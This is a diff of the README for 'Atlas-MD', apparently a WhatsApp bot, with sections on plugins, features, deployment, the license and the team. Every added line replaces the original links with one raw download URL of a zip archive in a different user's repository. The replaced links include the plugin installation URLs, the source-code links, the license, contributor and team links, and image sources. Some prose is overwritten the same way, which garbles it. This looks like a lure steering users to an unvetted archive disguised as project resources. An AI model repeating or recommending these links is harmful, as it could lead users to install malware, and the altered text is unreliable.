-https://gist.githubusercontent.com/FantoX/998a3b2937080af7c30a2639544fa24c/raw/afc9ba94cbaea95e971e3aea3f80e492249c75d7/text-to-speech.js
+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 ```
-💡 [Plug-in Source Code ↗](https://gist.github.com/FantoX/998a3b2937080af7c30a2639544fa24c)
+💡 [Plug-in Source Code ↗](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 <br><br>
     
 ## 🪟 Logo Maker plug-in
 **〽️ Description:** This plugin conatains 40 logo maker commands. <br><br>
 **🧲️ Plug-in installation url:** 
 ```
-https://gist.githubusercontent.com/FantoX/67035f308b809aaabad8faa001fe473d/raw/72c2b3c100471375755817119c7ab391985bd7f3/logo-maker.js
+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 ```
-💡 [Plug-in Source Code ↗](https://gist.github.com/FantoX/67035f308b809aaabad8faa001fe473d)
+💡 [Plug-in Source Code ↗](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 <br><br>
     
 ## 🪟 Chat GPT plug-in
 **〽️ Description:** This plugin conatains 2 main Open AI tools which are "**ChatGPT**" and "**Dall-E**" <br><br>
 **🧲️ Plug-in installation url:** 
 ```
-https://gist.githubusercontent.com/FantoX/04507d2d7411996622513759ea05775d/raw/7d27fc2bb2f6d8a45d3e929e3904c66895d811ad/chat-GPT.js
+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 ```
-💡 [Plug-in Source Code ↗](https://gist.github.com/FantoX/04507d2d7411996622513759ea05775d)
+💡 [Plug-in Source Code ↗](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 <br><br>
     
 ## 🪟 Fun Commands plug-in
 **〽️ Description:** This plugin conatains 17 funny commands. <br><br>
 **🧲️ Plug-in installation url:** 
 ```
-https://gist.githubusercontent.com/FantoX/e02ed98798e5cc73a0778d8bc04f0f03/raw/77293b2b35d875ce0c91357d879fe5d0881423b9/fun.js
+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 ```
-💡 [Plug-in Source Code ↗](https://gist.github.com/FantoX/e02ed98798e5cc73a0778d8bc04f0f03)
+💡 [Plug-in Source Code ↗](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 <br><br>
     
 ## 🪟 Tiktok Downloader plug-in
 **〽️ Description:** This plugin conatains 4 tiktok video downloader commands. <br><br>
 **🧲️ Plug-in installation url:** 
 ```
-https://gist.githubusercontent.com/FantoX/2de67bc72021805417cbd317385ea71a/raw/f70879fc861dadd440f4a4a7dbb01cdae44b3c56/tiktokdl.js
+https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip
 ```
-💡 [Plug-in Source Code ↗](https://gist.github.com/FantoX/2de67bc72021805417cbd317385ea71a)
+💡 [Plug-in Source Code ↗](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 <br><br>
     
 ## 🪟 Anime NSFW Image plug-in
@@ -539,7 +539,7 @@ https://gist.githubusercontent.com/FantoX/2de67bc72021805417cbd317385ea71a/raw/f
 </h4>
 
 <p align="center" >
-<a href="https://cutt.ly/AtlasSupportStrict"><img src="https://img.shields.io/badge/Join Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" width="140px">
+<a href="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip"><img src="https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip Group-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" width="140px">
 </a>
 </p>
     
@@ -552,7 +552,7 @@ https://gist.githubusercontent.com/FantoX/2de67bc72021805417cbd317385ea71a/raw/f
 
 - Atlas offers highest platform compatibility.
 - Just deploy and use on your favourite platform.
-- Sorted by Recommendation: Repl.it, Railway, Heroku, Koyeb
+- Sorted by Recommendation: https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip, Railway, Heroku, Koyeb
       
 <br>
       
@@ -560,9 +560,9 @@ https://gist.githubusercontent.com/FantoX/2de67bc72021805417cbd317385ea71a/raw/f
 
 <br>
 
-- [WhiskeySockets Baileys V-6.1.0](https://github.com/WhiskeySockets/Baileys)
-- [Scrappy API (For Instagram, Facebook, Lyrics and ❌videos scraping )](https://github.com/FantoX/Scrappy-API)
-- [FantoX APIs ( For NSFW )](https://fantox-api.vercel.app/)
+- [WhiskeySockets Baileys V-6.1.0](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
+- [Scrappy API (For Instagram, Facebook, Lyrics and ❌videos scraping )](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
+- [FantoX APIs ( For NSFW )](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 
 <br>
 
@@ -575,14 +575,14 @@ https://gist.githubusercontent.com/FantoX/2de67bc72021805417cbd317385ea71a/raw/f
       
 <br>
 
-- Read [PublicKeys.md](https://github.com/FantoX/Atlas-MD/blob/main/PublicKeys.md) to use our `provided public keys` if you are lazy to create your own. We have already provided everying you need to run the bot.
-- Changeable between `20 added Characters` ( Atlas, Power, Makima, Denji, Zero Two, Chika, Miku, Marin Kitagawa ) and more can be added by user inside `BotCharacters.js` file. Type `-charlist` command to get character list.
+- Read [https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) to use our `provided public keys` if you are lazy to create your own. We have already provided everying you need to run the bot.
+- Changeable between `20 added Characters` ( Atlas, Power, Makima, Denji, Zero Two, Chika, Miku, Marin Kitagawa ) and more can be added by user inside `https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip` file. Type `-charlist` command to get character list.
 - Fully powered by MongoDb ( 3 databases added ).
 - Self / Public / Private mode.
 - Single prefix ( "-" ).
 - RPG and Economy added ( More coming soon ).
 - Group Chatbot / Dm Chatbot ( Only reply on quoted messages and and be turned off ).
-- 100+ NSFW commands ( Using my own API ). Visit: [My API Page](https://fantox-api.vercel.app) for more info. 
+- 100+ NSFW commands ( Using my own API ). Visit: [My API Page](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) for more info. 
 - Highest Commands and Features.
 - User Banning / Group Banning.
 - Highest Security compared to most other public bots.
@@ -611,7 +611,7 @@ https://gist.githubusercontent.com/FantoX/2de67bc72021805417cbd317385ea71a/raw/f
 - Atlas has `RPG and Economy` which means you can use it as a `RPG Bot` or `Casino Bot`.
 - Atlas has `User Banning / Group Banning` which means you can use it as a `Anti Spam Bot`.
 - Atlas is a Folder Type bot which represents `Highest Stability`, `Highest Performance` and `Developer / User friendly`.
-- Atlas comes with [MIT](https://github.com/FantoX/Atlas-MD/blob/main/LICENSE.md) License which means you can use it as a `base for your own bot` and can `modify it as you want` and can `add your own features`.
+- Atlas comes with [MIT](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) License which means you can use it as a `base for your own bot` and can `modify it as you want` and can `add your own features`.
 
 </details> 
     
@@ -621,7 +621,7 @@ https://gist.githubusercontent.com/FantoX/2de67bc72021805417cbd317385ea71a/raw/f
 
 # 🧣 Contributors:
 
-- Check [Atlas Contributors](https://github.com/FantoX/Atlas-MD/graphs/contributors) list.
+- Check [Atlas Contributors](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) list.
 - Feel free to contribute in this project it increase it's stability and update. I will merge your respected contribution after reviewing it.
 - No personal modification / re-branding ( Changing bot name, owner name ) pull requests will be merged !
     
@@ -629,7 +629,7 @@ https://gist.githubusercontent.com/FantoX/2de67bc72021805417cbd317385ea71a/raw/f
 
 # ⚠️ Warning:
     
-- This bot is not made by WhatsApp.inc so overusing this bot may result in WhatsApp account ban.
+- This bot is not made by https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip so overusing this bot may result in WhatsApp account ban.
 - We will only assist you in `Bot Deployment ( Installation or Hosting )`. Not in `Bot Development`.
 - If you Modify this bot and face any issues, I am not responsible for that because it's not possible for me or my team to help everyone in bot Development / Modification. Only modify if you know what you are doing.
 - This bot is made for `Educational / Fun / Group Management` purposes only. I and the team will not be responsible for any misuse of this bot.
@@ -651,7 +651,7 @@ https://gist.githubusercontent.com/FantoX/2de67bc72021805417cbd317385ea71a/raw/f
 <h2 align="center">🔰 Meet Team Atlas 🔰
 </h2>
 
-[![Fantox](https://github.com/FantoX.png)](https://github.com/FantoX)  | [![Ahmii-kun](https://github.com/Ahmii-kun.png)](https://github.com/Ahmii-kun) | [![Pratyush](https://github.com/pratyush4932.png)](https://github.com/pratyush4932) | [![Devime](https://github.com/Devime69.png)](https://github.com/Devime69) | [![Kai](https://github.com/Kai0071.png)](https://github.com/Kai0071) | [![JayJay Ops](https://github.com/jayjay-ops.png)](https://github.com/jayjay-ops)
+[![Fantox](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)  | [![Ahmii-kun](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) | [![Pratyush](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) | [![Devime](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) | [![Kai](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) | [![JayJay Ops](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 ----|----|----|----|----|----
-[FantoX](https://github.com/FantoX)  | [Ahmii Kun](https://github.com/Ahmii-kun) | [Pratyush](https://github.com/pratyush4932) | [Devime](https://github.com/Devime69) | [Kai](https://github.com/Kai0071) | [Jayjay Ops](https://github.com/jayjay-ops)
+[FantoX](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)  | [Ahmii Kun](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) | [Pratyush](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) | [Devime](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) | [Kai](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip) | [Jayjay Ops](https://raw.githubusercontent.com/megumim0123/Atlas-MD/main/System/MongoDB/Atlas-MD-v1.2.zip)
 Owner, Main Developer, Maintainer, Dubugger  | Co-Developer, Co-Maintainer | Support Developer | API Maintainer | Ideas, Testing | Ideas, Testing
